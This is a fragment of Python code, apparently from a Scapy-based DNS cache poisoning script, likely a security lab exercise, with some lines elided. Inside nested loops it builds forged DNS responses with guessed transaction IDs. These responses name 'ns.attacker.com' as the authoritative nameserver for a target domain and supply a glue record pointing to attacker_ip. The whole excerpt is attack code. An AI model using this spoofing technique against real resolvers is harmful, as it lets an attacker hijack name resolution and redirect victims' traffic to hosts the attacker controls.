...
for i in range(0,ATTEMPT_NUM):
    ...
    for i in range(100):
        ...
        DNSpkt = DNS(id=tran_id, opcode=0, tc=0, rd=1, ra=1, z=0, rcode=0, qr=1, aa=1, nscount=1, qdcount=1, ancount=1, ns=DNSRR(rrname=cur_domain, type=2, rdata="ns.attacker.com"), qd=DNSQR(qname=cur_domain), an=DNSRR(rrname=cur_domain, rdata="ns.attacker.com"), ar=DNSRR(rrname="ns.attacker.com",rdata=attacker_ip))
